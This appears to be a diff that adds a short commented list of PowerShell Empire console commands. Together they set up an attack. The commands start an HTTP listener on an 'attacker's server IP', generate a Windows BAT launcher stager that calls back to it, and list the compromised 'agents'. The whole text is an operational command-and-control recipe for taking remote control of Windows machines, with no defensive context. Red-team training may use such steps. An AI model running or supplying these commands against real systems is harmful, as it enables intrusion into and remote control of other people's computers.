@@ -1,0 +1,10 @@
+./empire                                       # Start Empire console
+listeners                                      # Show existing listeners
+uselistener http                               # Use HTTP listener
+set Host http://192.168.1.5                    # Set attacker's server IP
+set Port 8080                                  # Set listener port
+execute                                        # Start the listener
+usestager windows/launcher_bat                 # Select BAT stager
+set Listener http                              # Bind stager to listener
+generate                                       # Generate the stager file
+agents                                         # Show active agents
